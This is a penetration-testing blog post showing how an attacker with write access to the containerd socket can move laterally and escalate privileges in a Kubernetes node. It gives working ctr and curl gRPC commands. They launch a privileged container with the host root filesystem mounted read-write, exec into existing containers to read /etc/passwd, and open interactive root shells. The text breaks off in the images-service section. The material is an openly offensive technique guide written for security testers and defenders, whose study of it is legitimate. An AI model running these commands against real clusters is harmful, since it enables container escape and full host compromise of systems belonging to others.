---
layout: post
title: "containerd socket exploitation"
date: 2025-01-30 11:20:00 +1100
author: Stephen Bradshaw
tags:
- kubernetes
- api
- pentesting
- pentest
- container
- containerd
- ctr
- pod
- authentication
- credentials
- captured credentials
- privilege escalation
- lateral movement
---

One common technique used by attackers in containerised environments is exploitation of the container runtime socket to move laterally or escalate privileges. This socket can be accessed by attackers when the socket is exposed directly in an exploited container or when the the attacker can access the containing hosts file system, usually with root privileges.

Once the attacker can access the socket file with write permissions, they can then communicate with it in various ways to run new containers or execute code in existing ones. The specifics of how this is done differ depending on the container runtime in use. If the runtime is Docker, then theres a lot of available information out there on how to use the socket offensively. Exploitation with commonly available tools like curl is quit straightforward because the API uses REST, allowing you to perform container admin using plain text HTTP requests.

One such example of an article on how exploit the Docker socket is [here](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket). 

Another container runtime thats becoming more and more widely used is [containerd](https://github.com/containerd/containerd), which has a different API than Docker and does not have the same amount of online resources on how to exploit access to the socket, so thats what Im going to talk about in this post.


# The  containerd socket 

The containerd socket has a default location of `/var/run/containerd/containerd.sock` and is a named pipe file that is usually only accesible by the root user. (If you're not familiar with how named pipe files work on Linux just think of them as like a TCP socket located in a named file on disk, which you can write to or read from using regular filesystem operations in order to communicate with "network" servers or clients that are doing the same). Most of the communication to the containerd runtime by orchestration tools such as Kubernetes and administration tools like `ctr` are sent through the medium of this socket file, which uses the [gRPC](https://grpc.io/) protocol for its messaging. gRPC essentially uses [Protobuf](https://protobuf.dev/) messages sent over [HTTP/2](https://developer.mozilla.org/en-US/docs/Glossary/HTTP_2), which makes it a little challenging to talk to using command line tools commonly available in many container images like `curl` or `wget`, although it can be possible, as we will see later. For this reason, its preferable to use actual containerd admin tools where this is an option.


# The ctr tool

The `ctr` tool is the "unsupported" command line admin tool for the containerd runtime and is provided within the containerd [release archive](https://containerd.io/downloads/). If you can get this tool onto a system or container that can access the containerd socket, it can make the process of exploiting the runtime very straightforward.

The tool will be default try and access the socket at its default location of `/var/run/containerd/containerd.sock`, however its possible to change this using the `--address` parameter, and I'll specifically reference this in the examples below.

Heres a simple example of using the tool to check communication to the socket is working by requesting its version information.

```
$ sudo ctr --address /var/run/containerd/containerd.sock version
Client:
  Version:  1.7.24
  Revision: 88bf19b2105c8b17560993bee28a01ddc2f97182
  Go version: go1.22.9

Server:
  Version:  1.7.24
  Revision: 88bf19b2105c8b17560993bee28a01ddc2f97182
  UUID: cc501e78-a8ad-4eff-8c02-58003ac69353
```

### List namespaces

Once we have done this, the next step is listing the namespaces in use by the containerd runtime as containers we might be interested may be invisible unless we get this parameter correct in the future calls we make to the API. We can list namespaces like so.

```
$ sudo ctr --address /var/run/containerd/containerd.sock ns ls
NAME     LABELS
buildkit
default
k8s.io
```

Since the machine I am running this on happens to be a Kubernetes node, we can see the `k8s.io` namespace in the list above - all the containers run by Kubernetes on this particular node will be accessible via this namespace only, and we will need to include the `-n k8s.io` switch in all future commands to see these containers. Its also likely that a system having this particular namespace is NOT running containers in any other namespaces. The `default` namespace is the one that will be used by default, and the one that will be referenced in all command executions that dont specify a particular namspace.

### List running containers in namespace

The next thing we are going to do is list the running containers in the Kubernetes (`k8s.io`) namespace, which we do like so:

```
$ sudo ctr --address /var/run/containerd/containerd.sock -n k8s.io containers list
CONTAINER                                                           IMAGE                                                                   RUNTIME
01a91532d97f8f7162c477dd1e402520d313e9c4333827d74a93cde25dddc1cc    registry.k8s.io/pause:3.6                                               io.containerd.runc.v2
05536e2ec91d018cdb4edac21ab613b22f0755721e082c99f81b87516bce60ec    registry.k8s.io/pause:3.6                                               io.containerd.runc.v2
0894b4942001821ad9c36949ae7c15fc2dd9b54bf6e5d531b6e5b03e6f5e313c    docker.io/calico/cni:v3.25.0                                            io.containerd.runc.v2
[SNIP]
3373c8e99b9381b150d30998203cbb6593f1e25b4c30a61f16669f9f8b5d8694    docker.io/library/springsaml:latest                                     io.containerd.runc.v2
[SNIP]
```

The output of the above is a very long list of running containers with their container ID and associated image that Ive redacted above in the interests of space. Given that these are Kubernetes containers the container ids are unfortunately very unhelpfully named, but the container IMAGE value can be somewhat useful in identifying which items are worth a closer look. In the above Ive made sure to include the listing for a container running an image `docker.io/library/springsaml:latest` which we will examine further.

To get a lot more information about a given container, to see if its something we are interested in, we can run the following command, referencing the container id from the `docker.io/library/springsaml:latest` entry in the list above.

```
$ sudo ctr --address /var/run/containerd/containerd.sock -n k8s.io containers info 3373c8e99b9381b150d30998203cbb6593f1e25b4c30a61f16669f9f8b5d8694
{
    "ID": "3373c8e99b9381b150d30998203cbb6593f1e25b4c30a61f16669f9f8b5d8694",
    "Labels": {
        "io.cri-containerd.kind": "container",
        "io.kubernetes.container.name": "springsaml",
        "io.kubernetes.pod.name": "springsaml-86df7bc9c5-zqgn8",
        "io.kubernetes.pod.namespace": "default",
        "io.kubernetes.pod.uid": "cc5f0b97-32f4-41fb-8182-4d2ea0ab8130"
    },
    "Image": "docker.io/library/springsaml:latest",
    "Runtime": {
        "Name": "io.containerd.runc.v2",
        "Options": {
            "type_url": "containerd.runc.v1.Options",
            "value": "SAE="
        }
    },
[SNIP]
```

We can see from the above redacted message that this gives us a lot more information on the container, including some labels that allow us to identify associated Kubernetes parameters, as well as metadata and environment variables (excluded from above output).

### Running our own containers


To run our own containers, we need to know what container image to use. This obviously depends on what we want to do with the container, but if we just want to achieve the common attacker scenario of running a privileged container with a host filesystem mount almost any regular (non cut down) image will do.  If we can find a suitable container image already available locally, this saves us the step of retreiving one, so lets check for a simple `nginx` image in the locally stored list. We run `image ls` and grep the output like so:

```
$ sudo ctr --address /var/run/containerd/containerd.sock -n k8s.io image ls | grep nginx
docker.io/library/nginx:1.14.2     application/vnd.docker.distribution.manifest.list.v2+json sha256:f7988fb6c02e0ce69257d9bd9cf37ae20a60f1df7563c3a2a6abe24160306b8d 42.6 MiB  linux/386,linux/amd64,linux/arm/v7,linux/arm64/v8,linux/ppc64le,linux/s390x
```

If we dont find anything suitable for our purposes locally we can always `image pull` something to get what we need, but in this case the image above is fine. 

This is how we run a privileged container with a host filesystem mount at `/host` using this local `nginx` image.

```
$ sudo ctr --address /var/run/containerd/containerd.sock -n k8s.io run --privileged --mount 'type=bind,src=/,dst=/host,options=rbind:rw' -d 'docker.io/library/nginx:1.14.2' nginx
```

No output is generally a good sign, but we can list containers and grep for `nginx` (the container id we specified in the above command) to confirm our container exists.

```
$ sudo ctr --address /var/run/containerd/containerd.sock -n k8s.io container ls | grep nginx
3bd8e95274f34f1ecf0b11e19f52127361327742e40ae707ac5613f1365f2e71    docker.io/library/nginx:1.14.2                                          io.containerd.runc.v2
8ebece262e1762688c8f8adf80fe6d017e2043523a0d74f5812530b38524e149    docker.io/library/nginx:1.14.2                                          io.containerd.runc.v2
nginx                                                               docker.io/library/nginx:1.14.2                                          io.containerd.runc.v2
```


### Executing code in running containers

Now lets look at how we execute code in running containers. We will do so in both one of the already running containers we identified as well as in our newly created one.

First lets do this in the existing container that we looked at in detail - the one with id `3373c8e99b9381b150d30998203cbb6593f1e25b4c30a61f16669f9f8b5d8694`.

If we then want to run a single command inside this container, and get the output, we can do this as follows (running `cat /etc/passwd`).

```
$ sudo ctr --address /var/run/containerd/containerd.sock -n k8s.io task exec --exec-id catpwd 3373c8e99b9381b150d30998203cbb6593f1e25b4c30a61f16669f9f8b5d8694 cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```

If we want an interactive shell into the container, we add the `-t` switch to allocate a TTY and run `/bin/bash` instead.

```
$ sudo ctr --address /var/run/containerd/containerd.sock -n k8s.io task exec -t --exec-id catpwd 3373c8e99b9381b150d30998203cbb6593f1e25b4c30a61f16669f9f8b5d8694 /bin/bash
root@springsaml-86df7bc9c5-zqgn8:/app# hostname
springsaml-86df7bc9c5-zqgn8
root@springsaml-86df7bc9c5-zqgn8:/app#
```

Now lets do the same in our `nginx` container that we created earlier.

```
$ sudo ctr --address /var/run/containerd/containerd.sock -n k8s.io task exec -t --exec-id catpwd nginx /bin/bash
root@kubecontainer:/# ls /host
bin  boot  dev	etc  home  lib	lib32  lib64  libx32  lost+found  media  mnt  opt  proc  root  run  sbin  snap	srv  swap.img  sys  tmp  usr  var
```

In the above, we see that the container is running as `root` and that the host filesystem is mounted to `/host`, just like we specified when we created it.


Now, while these particular examples of executing code in containers seemed to work in a very straightforward way in the above output, its worth diving into into some more detail of how this works because there are some details under the hood that can cause problems for us in some scenarios.

First of all, the `stdin`, `stdout` and `stderr` channels of the tasks/processes created in the container are NOT communicated with by means of the API itself, but instead are specified in the form of named pipe files that the calling application (in this case `ctr`) needs to create and read/write to/from. Whats more, when using `ctr`, the `ctr` tool and the `containerd` daemon need to use the same filenames for each of these pipes.  This is a problem when these two applications dont share the same root filesystem - for example when we are accessing the socket via the medium of a mounted host root filesystem. In these cases, to actually directly access these process handles directly using `ctr`, we need to utilise a shared section of the filesystem that both client and server can access via the same named path, and inform the `ctr` tool of this path using the `--fifo-dir` switch.

Lets take an example where we are running `ctr` from within a compromised container where the hosts root filesystem is mounted at `/host` in the container. In this case (assuming we dont just chroot within the container), the containerd socket is being accessed from the path `/host/run/containerd/containerd.sock`. To make an interactive shell like the example above work, we can create a path `/tmp/offsec` on the host filesystem (via creating `/host/tmp/offsec` in our container) and then symbolically link this path to the same path `/tmp/offsec` in the container. Then we exec the task pointing to `/host/run/containerd/containerd.sock` as the socket address and `/tmp/offsec` as the FIFO path.

An example of commands to achieve this would look something like the following:
```
$ mkdir /host/tmp/offsec
$ ln -s /host/tmp/offsec /tmp/offsec
$ ctr --address /host/run/containerd/containerd.sock -n k8s.io task exec -t --exec-id catpwd --fifo-dir /tmp/offsec  3373c8e99b9381b150d30998203cbb6593f1e25b4c30a61f16669f9f8b5d8694 /bin/bash
```

Another factor to pay attention to is the `--exec-id` parameter. This is a mandatory parameter that we have to provide on each use of this command, and can be set to any string value. The reason for this parameter is that these exec operations we have been providing actually involve a number of different underlying API calls - one to create the task (define the process details), another to start it (run the process), and another to remove the task once its no longer needed. All of these steps are tied together via their associated API calls using a common `exec-id`. When we run commands via the `ctr` tool we usually dont need to care too much about this unless theres an error - we can run multiple different subsequent (but not simultaneous) commands using the same `exec-id` without a problem. However, if theres a cleanup problem with a task run with `ctr`, or when we make the API calls directly ourselves, we will get an error message when we try and create a task with an `exec-id` that already exists, similar to `id catpwd: already exists`.


If we happen to "break" any tasks, we can clean them up with `ctr` like in the following example for a broken task `catpwd` in container `3373c8e99b9381b150d30998203cbb6593f1e25b4c30a61f16669f9f8b5d8694`:
```
$ sudo ctr -n k8s.io tasks delete 3373c8e99b9381b150d30998203cbb6593f1e25b4c30a61f16669f9f8b5d8694 --exec-id catpwd
```


### Deleting a container

Now lets clean up the container we created earlier. This involves stopping it (killing its associated task) and then deleting the container like so.

```
$ sudo ctr --address /var/run/containerd/containerd.sock -n k8s.io task kill nginx
$ sudo ctr --address /var/run/containerd/containerd.sock -n k8s.io container delete nginx
```

Now we confirm that its gone.
```
$ sudo ctr --address /var/run/containerd/containerd.sock -n k8s.io container ls | grep nginx
3bd8e95274f34f1ecf0b11e19f52127361327742e40ae707ac5613f1365f2e71    docker.io/library/nginx:1.14.2                                          io.containerd.runc.v2
8ebece262e1762688c8f8adf80fe6d017e2043523a0d74f5812530b38524e149    docker.io/library/nginx:1.14.2                                          io.containerd.runc.v2
```


Now lets have a look at doing these same tasks without the `ctr` tool.




# curl

If it is not possible to get `ctr` onto the system or container that you are using to access the containerd socket it IS possible to do many of the tasks above using a version of curl that supports HTTP2 and unix sockets (this might apply to wget too but thats left as an exercise for the reader).

In detail, the main factors affecting whether this will be possible are:
* The curl command must support [http2](https://everything.curl.dev/http/versions/http2.html)
* The curl command must have the `--http2-prior-knowledge` switch which communicates HTTP2 from the start of the transaction and does not attempt to upgrade the connection from HTTP/0.9
* The curl command must be able to support talking to unix sockets, which in my version is done using the `--unix-socket` switch
* Its definitely preferrable to be able to write/read binary files to some location on the filesystem for some operations

Given those conditions, here are some further details about communicating with the containerd API we need to understand. 

As mentioned earlier, the communication protocol used to talk with the API is gRPC. This involves sending Protobuf messages over HTTP2, with some additional caveats. The first is use of the [gRPC 5 byte Length-Prefixed-Message header](https://github.com/grpc/grpc/blob/master/doc/PROTOCOL-HTTP2.md) before each Protobuf encoded message. This is basically just 5 bytes at the start of the message with the size of the following data encoded big endian. For an message with empty (no) data, this means 5 null bytes is sent. The second is the use of HTTP2 trailers sent by the server with responses to indicate the status of certain operations. Trailers are basically like HTTP message headers, but sent AFTER the data in the response. This means you will want to be running `curl` commands with verbose output (`-v` switch) to see this header data when you make requests.

The various API endpoints are defined in `*.proto` files available under the tree [here](https://github.com/containerd/containerd/tree/main/api). You direct requests to various [service endpoints](https://github.com/containerd/containerd/tree/main/api/services/) by setting values in the `:path` of a `POST` HTTP2 request (like the path in the URL from HTTP/1.1), and each request generally ha an associated Protobuf `*Request` and `*Response` messages associated. Some of these are quite simple, but the more complex examples require use to do some offline Protobuf encoding as well as sending and receiving of largish binary files.  There are some kludges we can do, but its generally easier if we can write to/read from the filesystem to facilitate this. 

For sending data using only the command line we can echo (`echo -ne "<DATA>"`) and pipe using the `--data-binary @-` switch to read from STDIN. We can also output to the command line STDOUT using  `--output -` and pipe into something like `strings` to get a decent general idea of the response content where its non empty. For bigger binary files, if we want to "echo" we can use [helper tools](https://github.com/stephenbradshaw/pentesting_stuff/blob/master/containerd/echoer.py) to assist with the encoding.

If we can use the filesystem to store the content we send and receive, we can use `--data-binary @/tmp/filein` to read binary data from a file and `--output /tmp/fileout` to write it. This simplifies our command lines a lot, makes it easier to concentrate on the headers in the response without also being spammed with response content and allows us the ability to properly decode the response data offline if we can extract the binary content properly after the command is run.

### A basic curl request to the API

Now lets look at the simplest example of a curl request to this API - requesting the version of the containerd daemon, using the `Version` service. This service has one endpoint, with one defined message type for the response with all of this being described in [this .proto file](https://github.com/containerd/containerd/blob/main/api/services/version/v1/version.proto). 

Heres a representative request.


```
$ echo -ne "\x00\x00\x00\x00\x00" | sudo curl -v -s --http2-prior-knowledge --unix-socket /run/containerd/containerd.sock -X POST  -H "content-type: application/grpc" -H "te: trailers"  -H "grpc-accept-encoding: gzip" http://localhost/containerd.services.version.v1.Version/Version --data-binary @- --output /tmp/versionresponse.bin
*   Trying /run/containerd/containerd.sock:0...
* Connected to localhost (/run/containerd/containerd.sock) port 80 (#0)
* Using HTTP2, server supports multiplexing
* Connection state changed (HTTP/2 confirmed)
* Copying HTTP/2 data in stream buffer to connection buffer after upgrade: len=0
* Using Stream ID: 1 (easy handle 0x55c22b6bdec0)
> POST /containerd.services.version.v1.Version/Version HTTP/2
> Host: localhost
> user-agent: curl/7.81.0
> accept: */*
> content-type: application/grpc
> te: trailers
> grpc-accept-encoding: gzip
> content-length: 5
>
} [5 bytes data]
* We are completely uploaded and fine
* Connection state changed (MAX_CONCURRENT_STREAMS == 4294967295)!
< HTTP/2 200
< content-type: application/grpc
<
{ [55 bytes data]
< grpc-status: 0
< grpc-message:
* Connection #0 to host localhost left intact
```


Lets look at the important features of this example, many of which we will also use in future more complex requests:
* **View response headers**: We use the `-v` switch so we can see the gRPC HTTP response trailers that indicate the success/failure status of our request. The `grpc-status` of `0` here means the request was successful. The `grpc-message` here is empty, normal for a successful request, but when the request fails this can have useful information for throubleshooting.
* **Transport protocol settings and address**: The `--http2-prior-knowledge` switch makes curl use HTTP2 from the start of the connection, differentiated from the `-http2` switch which will initiate an upgrade from HTTP/0.9, and `--unix-socket` identifies the address
* **Set gRPC headers**: The `-H "content-type: application/grpc" -H "te: trailers"  -H "grpc-accept-encoding: gzip"` switches identify to the server that you're communicating using gRPC messages and that the client will accept the `grpc-status` and `grpc-message` trailers (although leaving off the `-H "te: trailers" ` header does not usually cause a problem)
* **Url**: We use a URL of `http://localhost/containerd.services.version.v1.Version/Version`, which sends the communication without TLS wrapping and addresses the service at `/containerd.services.version.v1.Version/Version`. The `:authority` of `localhost` is ignored by the server and can be set to any value that results in a valid URL from curls perspective.
* **Request and response content**: We use a `-X POST` method to send data (all of these API calls use POST requests), we write the response to `/tmp/122` with `--output /tmp/122` and read from STDIN with `--data-binary @-` which uses the 5 null bytes "empty" message we piped into the curl command using `echo -ne "\x00\x00\x00\x00\x00"`. We will look at how to parse the response data in `/tmp/122` in a moment.

While a lot of these parameters will remain consistent through all of the different API requests we will send using curl, the service address (in this example `/containerd.services.version.v1.Version/Version`) and the request and response data will change depending on which API service we want to communicate with. As mentioned earlier, the definitions for the various services available are defined in `*.proto` files stored [here](https://github.com/containerd/containerd/tree/main/api/services/), and given a basic understanding of how to send requests to the API using curl the next question you might have is how do we identify the available endpoints and the requests and responses that go along with it? Also, in cases where the request or response is more complex than the empty type which is just 5 null bytes, how do we read and write these messages?

### Understanding and exploring the .proto service definition files and parsing protobuf messages

To enable communicating with the containerd API, I created a [simple tool](https://github.com/stephenbradshaw/pentesting_stuff/blob/master/containerd/protobuf_parser.py) that can read the Python version of the service definition .proto files and list the service endpoints and the request and response message types associated with each endpoint. In addition, the tool will also allow you to read and write each of these message types, inclusive of the gRPC Length-Prefixed-Message header. The idea is to use this tool offline to process protobuf message files sent with curl on compromised containers.

Essentially, the process works like this:
* Grab [the tool](https://github.com/stephenbradshaw/pentesting_stuff/blob/master/containerd/protobuf_parser.py) and install its Python dependency using `pip install protobuf`
* Download the .proto file of interest from [here](https://github.com/containerd/containerd/tree/main/api/services/)
* Read the .proto file and identify any external dependencies (any coming from github.com) - these will need to be downloaded and processed individually and their references updated to local ones
* Use the [protoc](https://grpc.io/docs/protoc-installation/) tool to convert the .proto file and any external dependencies to their Python equivalent like so: `protoc --python_out=. <filename>.proto` to create `<filename>_pb2.py`
* Parse the data:
    - View service and message type information using `python protobuf_parser.py -m <filename>_pb2.py`
    - Read a binary request or response message of type `MessageType` type using `python protobuf_parser.py -m <filename>_pb2.py -t MessageType -d /tmp/binary_message.bin`
    - Take a JSON document respresenting a message of type `MessageType` and convert it to protobuf type using `python protobuf_parser.py -m <filename>_pb2.py -t MessageType -i /tmp/message_data.json`


Lets look at an example using [version.proto](https://github.com/containerd/containerd/blob/main/api/services/version/v1/version.proto), so we can use the results to understand the curl request we made earlier.

First grab the script and install the Python dependencies:
```
$ wget https://raw.githubusercontent.com/stephenbradshaw/pentesting_stuff/refs/heads/master/containerd/protobuf_parser.py
$ sudo pip install protobuf
```

Then install the protoc tool. Im doing this on Ubuntu and had some trouble with the version of the tool from the apt repositories so instead used the latest binary [release](https://github.com/protocolbuffers/protobuf/releases) available at the time and unzipped it (the binary will be created at `bin/protoc`)
```
$ wget https://github.com/protocolbuffers/protobuf/releases/download/v29.2/protoc-29.2-linux-x86_64.zip
$ unzip protoc-29.2-linux-x86_64.zip
```

Now with the base requirements resolved we want to check the dependencies of the .proto file we are about to use to see if there are any external dependencies. We want to look for `import` lines and any that reference `github.com` need to be downloaded individually, their Python modules created and their import references updated to a local file path.

In the case of the version.proto file, there is only one dependency as shown [here](https://github.com/containerd/containerd/blob/2ac2b9c909fb64f4d06958a0ca2f556bec348d05/api/services/version/v1/version.proto#L21), which at the time of writing looks as follows. There are no external dependencies to convert here.

```
import "google/protobuf/empty.proto";
```


Now we grab the .proto file of interest and create the Python module implementation:

```
$ wget https://raw.githubusercontent.com/containerd/containerd/refs/heads/main/api/services/version/v1/version.proto
$ bin/protoc --python_out=. version.proto
```


At this point we can use the resulting Python module of `version_pb2.py` to understand the service. Running like the following will list the services by path, their inputs and outputs, and will describe the message types used in various levels of detail, with some rough JSON template examples being provided for the primary message types defined in this 
```
$ python protobuf_parser.py -m version_pb2.py
Services:
* /containerd.services.version.v1.Version/Version
      Input: Empty
      Output: VersionResponse

==================================

Dependant Message Types:
* Empty

==================================

Message Types:
* VersionResponse
  Fields:
      version - string
      revision - string

  Rough JSON example (might need tweaking):

{
    "version": "string",
    "revision": "string"
}

==================================

```


Now lets use this to try and parse the response data from the version request we made with curl. To do this, we need to run the tool and reference the binary data file we want to read (`/tmp/122`) with the `-d` switch and we also need to identify the type of message we want to read it as with `-t`. If we dont specify a type, the tool will tell us we need to and will list the known types we can use.
```
$ ./protobuf_parser.py -m version_pb2.py -d /tmp/versionresponse.bin
Provide a type for parsing of the response data file using -t
Available types include: VersionResponse
$ ./protobuf_parser.py -m version_pb2.py -d /tmp/versionresponse.bin -t VersionResponse
version: "1.7.24"
revision: "88bf19b2105c8b17560993bee28a01ddc2f97182"
```

We can see the version and git revision have been returned.


### List namespaces with curl

We can list namespaces using the [namespace service](https://github.com/containerd/containerd/blob/main/api/services/namespaces/v1/namespace.proto). Grab the .proto file and generate the Python implementation as per the process above and lets look at the endpoints.

```
$ ./protobuf_parser.py -m namespace_pb2.py
Services:
* /containerd.services.namespaces.v1.Namespaces/Get
      Input: GetNamespaceRequest
      Output: GetNamespaceResponse
* /containerd.services.namespaces.v1.Namespaces/List
      Input: ListNamespacesRequest
      Output: ListNamespacesResponse
* /containerd.services.namespaces.v1.Namespaces/Create
      Input: CreateNamespaceRequest
      Output: CreateNamespaceResponse
* /containerd.services.namespaces.v1.Namespaces/Update
      Input: UpdateNamespaceRequest
      Output: UpdateNamespaceResponse
* /containerd.services.namespaces.v1.Namespaces/Delete
      Input: DeleteNamespaceRequest
      Output: Empty

==================================
[SNIP]

```

The service we want is `/containerd.services.namespaces.v1.Namespaces/List`, which takes a `ListNamespacesRequest` as input and generates a `ListNamespacesResponse` as output. The relevant message types look like the following (extracted from the output of the previous command)

```
==================================
* ListNamespacesRequest
  Fields:
      filter - string

  Rough JSON example (might need tweaking):

{
    "filter": "string"
}

==================================
* ListNamespacesResponse
  Fields:
      namespaces - Namespace

  Rough JSON example (might need tweaking):

{
    "namespaces": {"name": "string", "labels": "LabelsEntry"}
}
```

The `ListNamespacesRequest` only has a single parameter that can filter the list of namespaces returned, but if we want to return all of them, we can just send a message with this value unset, which is just a null entry. Heres the request.

```
$ echo -ne "\x00\x00\x00\x00\x00" | sudo curl -v -s --http2-prior-knowledge --unix-socket /run/containerd/containerd.sock -X POST  -H "content-type: application/grpc" -H "te: trailers"  -H "grpc-accept-encoding: gzip" http://localhost/containerd.services.namespaces.v1.Namespaces/List --data-binary @- --output /tmp/listnamespacessresponse.bin
*   Trying /run/containerd/containerd.sock:0...
* Connected to localhost (/run/containerd/containerd.sock) port 80 (#0)
* Using HTTP2, server supports multiplexing
* Connection state changed (HTTP/2 confirmed)
* Copying HTTP/2 data in stream buffer to connection buffer after upgrade: len=0
* Using Stream ID: 1 (easy handle 0x55c115065ec0)
> POST /containerd.services.namespaces.v1.Namespaces/List HTTP/2
> Host: localhost
> user-agent: curl/7.81.0
> accept: */*
> content-type: application/grpc
> te: trailers
> grpc-accept-encoding: gzip
> content-length: 5
>
} [5 bytes data]
* We are completely uploaded and fine
* Connection state changed (MAX_CONCURRENT_STREAMS == 4294967295)!
< HTTP/2 200
< content-type: application/grpc
<
{ [38 bytes data]
< grpc-status: 0
< grpc-message:
* Connection #0 to host localhost left intact
```


This is what we get when we parse the response file:
```
$ ./protobuf_parser.py -m namespace_pb2.py -d /tmp/listnamespacessresponse.bin -t ListNamespacesResponse
namespaces {
  name: "buildkit"
}
namespaces {
  name: "default"
}
namespaces {
  name: "k8s.io"
}

```


### List running containers in namespace with curl

We list containers using the [containers service](https://github.com/containerd/containerd/blob/2ac2b9c909fb64f4d06958a0ca2f556bec348d05/api/services/containers/v1/containers.proto). Grab the .proto file and generate the Python implementation as per the process above and lets look at the endpoints.

```
$ ./protobuf_parser.py -m containers_pb2.py
Services:
* /containerd.services.containers.v1.Containers/Get
      Input: GetContainerRequest
      Output: GetContainerResponse
* /containerd.services.containers.v1.Containers/List
      Input: ListContainersRequest
      Output: ListContainersResponse
* /containerd.services.containers.v1.Containers/ListStream
      Input: ListContainersRequest
      Output: ListContainerMessage
* /containerd.services.containers.v1.Containers/Create
      Input: CreateContainerRequest
      Output: CreateContainerResponse
* /containerd.services.containers.v1.Containers/Update
      Input: UpdateContainerRequest
      Output: UpdateContainerResponse
* /containerd.services.containers.v1.Containers/Delete
      Input: DeleteContainerRequest
      Output: Empty

==================================

[SNIP]
```

The service we want is `/containerd.services.containers.v1.Containers/List`, which takes a `ListContainersRequest` as input and generates a `ListContainersResponse` as output. The relevant message types look like the following (extracted from the output of the previous command)

```
==================================
* ListContainersRequest
  Fields:
      filters - string

  Rough JSON example (might need tweaking):

{
    "filters": "string"
}

==================================
* ListContainersResponse
  Fields:
      containers - Container

  Rough JSON example (might need tweaking):

{
    "containers": {"id": "string", "labels": "LabelsEntry", "image": "string", "runtime": "Runtime", "spec": "Any", "snapshotter": "string", "snapshot_key": "string", "created_at": "Timestamp", "updated_at": "Timestamp", "extensions": "ExtensionsEntry", "sandbox": "string"}
}
```


The `ListContainersRequest`, in a similar fashion to the `ListNamespacesRequest` request we looked at previously only has a single parameter that can filter the list of containers returned, meaning we can use an empty message again for input if we dont want to filter results. What you may notice however, is that there is no obvious way in this request message to specify which namespace we want to list containers from. How do we do this? As it turns out, we actually need to set a specific header `containerd-namespace` to specify a namespace for requests, as defined in the containerd code [here](https://github.com/containerd/containerd/blob/3b15606e196e450cf817fa9f835ab5324b35a28b/pkg/namespaces/grpc.go#L27).


So, to list containers in the `k8s.io` namespace, we add the `-H "containerd-namespace: k8s.io"` option to specify we want results from this namespace only, with the command looking like so:
```
$ echo -ne "\x00\x00\x00\x00\x00" | sudo curl -v -s --http2-prior-knowledge --unix-socket /run/containerd/containerd.sock -X POST  -H "content-type: application/grpc" -H "te: trailers"  -H "grpc-accept-encoding: gzip" -H "containerd-namespace: k8s.io" http://localhost/containerd.services.containers.v1.Containers/List --data-binary @- --output /tmp/listcontainersresponse.bin
*   Trying /run/containerd/containerd.sock:0...
* Connected to localhost (/run/containerd/containerd.sock) port 80 (#0)
* Using HTTP2, server supports multiplexing
* Connection state changed (HTTP/2 confirmed)
* Copying HTTP/2 data in stream buffer to connection buffer after upgrade: len=0
* Using Stream ID: 1 (easy handle 0x559ec3176ec0)
> POST /containerd.services.containers.v1.Containers/List HTTP/2
> Host: localhost
> user-agent: curl/7.81.0
> accept: */*
> content-type: application/grpc
> te: trailers
> grpc-accept-encoding: gzip
> containerd-namespace: k8s.io
> content-length: 5
>
* Connection state changed (MAX_CONCURRENT_STREAMS == 4294967295)!
} [5 bytes data]
* We are completely uploaded and fine
< HTTP/2 200
< content-type: application/grpc
<
{ [32727 bytes data]
< grpc-status: 0
< grpc-message:
* Connection #0 to host localhost left intact
```


And if we parse the response file as a `ListContainersResponse` message:
```
$ ./protobuf_parser.py -m containers_pb2.py -d /tmp/listcontainersresponse.bin -t ListContainersResponse
containers {
  id: "01a91532d97f8f7162c477dd1e402520d313e9c4333827d74a93cde25dddc1cc"
  labels {
    key: "service.istio.io/canonical-revision"
    value: "latest"
  }
  labels {
    key: "service.istio.io/canonical-name"
    value: "argocd-applicationset-controller"
  }
  labels {
    key: "security.istio.io/tlsMode"
    value: "istio"
  }
  labels {
    key: "pod-template-hash"
    value: "5b899f5459"
  }
  labels {
    key: "io.kubernetes.pod.uid"
    value: "976a064f-a3a8-4153-83a7-475403b114b9"
  }
[SNIP]
```

This response includes all the details about each container

### Running our own containers with curl

As with the `ctr` example, we want to list the local container images available locally first so we can identify an image to use for the container we want to run. The [images protocol definition file](https://github.com/containerd/containerd/blob/2ac2b9c909fb64f4d06958a0ca2f556bec348d05/api/services/images/v1/images.proto) can be used to view services relating to images. 

An important thing to note here is that this is the first of the .proto files we have looked at so far that has a github based dependency, which you can see [here](https://github.com/containerd/containerd/blob/2ac2b9c909fb64f4d06958a0ca2f556bec348d05/api/services/images/v1/images.proto#L24).

The line looks like this:

```
import "github.com/containerd/containerd/api/types/descriptor.proto";
```

In this case, we want to download the [depenency file](https://github.com/containerd/containerd/blob/2ac2b9c909fb64f4d06958a0ca2f556bec348d05/api/types/descriptor.proto) individually, process it using `protoc`, store the .proto file and the generated Python output in the present working directory and change the import line as follows

```
import "descriptor.proto";
```

Remember to do this for all future .proto files to make sure they will work correctly.


Now, heres the list of services related to the `image.proto` descriptor:

```
$ ./protobuf_parser.py -m images_pb2.py
Services:
* /containerd.services.images.v1.Images/Get
      Input: GetImageRequest
      Output: GetImageResponse
* /containerd.services.images.v1.Images/List
      Input: ListImagesRequest
      Output: ListImagesResponse
* /containerd.services.images.v1.Images/Create
      Input: CreateImageRequest
      Output: CreateImageResponse
* /containerd.services.images.v1.Images/Update
      Input: UpdateImageRequest
      Output: UpdateImageResponse
* /containerd.services.images.v1.Images/Delete
